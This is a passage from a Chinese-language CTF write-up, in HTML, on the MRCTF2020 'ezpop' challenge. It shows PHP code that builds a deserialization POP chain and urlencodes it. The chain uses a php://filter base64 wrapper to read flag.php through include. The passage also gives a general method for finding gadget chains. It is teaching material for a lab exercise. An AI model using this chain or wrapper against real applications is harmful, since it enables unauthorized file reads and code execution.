-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    protected $var = "php://filter/convert.base64-encode/resource=flag.php";</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">}</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="x">class Test { public $p; }</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="x">class Show { public $source; public $str; }</span>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="x">$pop = new Show;</span>
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="x">$pop-&gt;source = new Show;        // 外层 source → 内层 Show（触发 __toString）</span>
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="x">$pop-&gt;source-&gt;str = new Test;   // 内层的 str → Test（触发 __get）</span>
-</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="x">$pop-&gt;source-&gt;str-&gt;p = new Modifier;   // Test 的 p → Modifier（触发 __invoke）</span>
-</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="x">echo serialize($pop);</span>
-</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="x">echo ("&lt;br&gt;");</span>
-</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="x">echo urlencode(serialize($pop));</span>
-</span></code></pre></div>
-<p><strong>四层的分工：</strong></p>
-<table>
-<thead>
-<tr>
-<th>层</th>
-<th>属性</th>
-<th>给谁用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>外层 <code>Show</code></td>
-<td><code>source</code></td>
-<td><code>__wakeup</code> 的 <code>preg_match</code></td>
-</tr>
-<tr>
-<td>内层 <code>Show</code></td>
-<td><code>str</code></td>
-<td><code>__toString</code> 的 <code>$this-&gt;str</code></td>
-</tr>
-<tr>
-<td><code>Test</code></td>
-<td><code>p</code></td>
-<td><code>__get</code> 的 <code>$function</code></td>
-</tr>
-<tr>
-<td><code>Modifier</code></td>
-<td><code>var</code></td>
-<td><code>append</code> 的 <code>include</code></td>
-</tr>
-</tbody>
-</table>
-<h3 id="_6"><a class="toclink" href="mrctf2020-ezpop/#_6">为什么要用伪协议</a></h3>
-<p><strong>这里因为直接 include 会把 PHP 代码执行掉（而 <code>flag.php</code> 里没有 echo，执行完什么都不输出），
-所以我们利用伪协议先把它编码成 base64 —— 编码后的文本不含 <code>&lt;?php</code>，<code>include</code> 就会</strong>原样输出<strong>而不是执行。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>php://filter/convert.base64-encode/resource=flag.php
-</span></code></pre></div>
-<h3 id="0"><a class="toclink" href="mrctf2020-ezpop/#0"><code>\0</code> 的坑</a></h3>
-<p><strong>注意：因为 <code>var</code> 的属性是 <code>protected</code>，序列化时会生成 <code>\0*\0var</code>（长度 6，两个空字节也算）。</strong></p>
-<p><strong>但是如果你直接把它复制到 URL 上，这两个空字节会被吞掉，<code>s:6:"*var"</code> 长度就对不上了。</strong></p>
-<p><strong>所以生成时最好就直接 <code>urlencode()</code>，避免出错：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="x">echo urlencode(serialize($pop));</span>
-</span></code></pre></div>
-<p><strong>编码后这一小段是 <code>s:6:%22%00*%00var%22</code>。</strong></p>
-<h3 id="flag"><a class="toclink" href="mrctf2020-ezpop/#flag">拿 flag</a></h3>
-<p><strong>最后得到 base64 编码的 flag，解码就好了。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>?pop=&lt;urlencode 后的整条串&gt;
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>→ 页面吐出 base64
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>→ 解码 → flag.php 源码 → flag
-</span></code></pre></div>
-<h3 id="_7"><a class="toclink" href="mrctf2020-ezpop/#_7">这题的收获</a></h3>
-<p><strong>第一次做 POP 链，最有用的一条是：</strong></p>
-<blockquote>
-<p><strong>不能从头读代码，要从</strong>能干活的那个函数<strong>（sink）往回找。</strong></p>
-</blockquote>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>① 找 sink      include / eval / system / call_user_func
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>② 谁能碰到它    哪个魔术方法里调用了它
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>③ 那个魔术方法怎么触发   对象当字符串？当函数？读不存在的属性？
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>④ 一路往回，直到 unserialize
-</span></code></pre></div>
-<p><strong>中间那条 <code>__get</code> 最容易绕晕：它不是"属性值为空"，而是"这个类里根本没有这个属性"。</strong>
-<strong><code>Test</code> 只有 <code>$p</code>，所以读 <code>-&gt;source</code> 必然触发 —— 你什么都不用设。</strong></p>
     
     
   </div>
